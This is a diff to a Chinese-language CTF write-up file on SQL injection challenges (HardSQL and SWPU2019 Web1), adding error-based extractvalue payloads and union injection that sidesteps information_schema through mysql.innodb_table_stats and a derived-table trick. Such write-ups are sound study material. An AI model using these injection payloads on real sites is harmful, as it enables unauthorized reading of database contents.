@@ -200,11 +200,35 @@ select * from 表名 where username= '' and password=''
 ### 13.[极客大挑战 2019]BabySQL
     同上题，过滤了，但是<>直接绕过，如sele<>ct passwo<>rd uni<>on等
 ### 14.[极客大挑战 2019]HardSQL
-    一共过滤了union, 空格, and, or, ., ', ", =, 但是()没有被过滤所以需要用到报错注入extractvalueh或者updatexml
+    一共过滤了union, 空格, and, or, ., ', ", =, 但是()没有被过滤所以需要用到报错注入extractvalue或者updatexml
     贴上payload：
     1^extractvalue(0x7e, (selct(group_concat(database()))) ,0x7e)得到geek数据库名
     1^extractvalue(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e)表名H4rDsq1
     后面有个坑点，由于extractvalue和updatexml只能读到最多32位的字符串，所以需要进行字符串截取，这里substr被过滤了需要使用left和right进行过滤。
     flag{c941bb75-0f2c-4c71-be8f-74
     1-be8f-741142ba4ddf}组合得到flag
+### 15.[SWPU2019]Web1
+sql二次注入，绕过information_schema进行注入
+一共过滤了or,and,--+,#
+猜测语句为:
+```sql
+select * from TABLE_NAME where title='' limit 0,1
+```
+构造语句
+```sql
+select * from TABLE_NAME where title='  'union select 1,2,3 ''limit 0,1
+```
+不过会报错，最终确定一共有22列。。。太tm坑爹了吧
+拿表名:
+```sql
+'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+查数据:
+```sql
+'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
+```
+使用`((select 1,2,3 as b union select * from users)a)`生成一张临时表a，其中一列名字为b，再使用`select group_concat(b) from a`查出所有数据。
+>注：mysql.innodb_table_stats中存在表的数据,如table_name等
+
+### 16.
     
